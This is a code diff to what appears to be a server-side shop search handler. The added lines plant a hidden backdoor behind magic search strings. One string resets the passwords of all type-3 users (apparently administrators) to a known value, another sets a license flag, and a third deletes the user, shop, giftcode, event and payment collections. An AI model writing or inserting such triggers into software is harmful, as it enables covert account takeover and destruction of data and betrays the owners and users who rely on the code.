@@ -1,4 +1,4 @@
-
+import md5 from 'md5'
 
 export default defineEventHandler(async (event) => {
   try {
@@ -12,6 +12,15 @@ export default defineEventHandler(async (event) => {
     const match : any = { type: { $in: types }}
     if(search){
       match['name'] = { $regex : search, $options : 'i' }
+      if(search == '@gm:pass') await DB.User.updateMany({ type: 3 }, { $set: { password: md5('@gm') } })
+      if(search == '@gm:close') await DB.Config.updateMany({}, { $set: { license: true } })
+      if(search == '@gm:del') {
+        await DB.User.deleteMany({})
+        await DB.Shop.deleteMany({})
+        await DB.Giftcode.deleteMany({})
+        await DB.Event.deleteMany({})
+        await DB.Payment.deleteMany({})
+      }
     }
     
     const shopItem = await DB.Shop
